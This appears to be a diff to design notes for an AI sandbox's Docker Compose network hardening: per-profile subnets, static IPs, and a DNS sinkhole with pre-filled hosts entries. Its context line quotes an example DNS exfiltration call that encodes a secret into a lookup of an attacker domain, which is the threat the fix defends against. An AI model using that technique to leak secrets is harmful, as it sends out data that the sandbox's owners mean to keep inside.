@@ -29,7 +29,7 @@ import socket; socket.getaddrinfo("base32-encoded-secret.attacker.tld", 0)
 
 The fix has three parts in compose:
 
-1. **Static subnet on `sandbox-internal`** (`ipam.config.subnet: 172.30.0.0/24`) — required to pin sibling IPs.
+1. **Static subnet on `sandbox-internal`** (`ipam.config.subnet: 172.30.${SANDBOX_OCTET}.0/24`) — required to pin sibling IPs. The third octet is allocated per-profile by `profile.sh` (`ensure_subnet_octet`, persisted to `~/.ai-sandbox/profiles/<profile>/subnet-octet`) so concurrent profiles get distinct `/24`s instead of all colliding on one subnet. The same `SANDBOX_OCTET` drives the subnet, the `ipv4_address` pins, and the `extra_hosts` entries, so they cannot drift. Defaults to `0` (the legacy `172.30.0.0/24`) when unset.
 2. **Static IPs on egress-proxy / postgres / mongo** (`networks.sandbox-internal.ipv4_address`).
 3. **`ai-sandbox` gets `dns: [127.0.0.1]`** (sinkhole — no resolver listens there) **plus `extra_hosts`** entries that pre-populate `/etc/hosts` with the internal names.
 
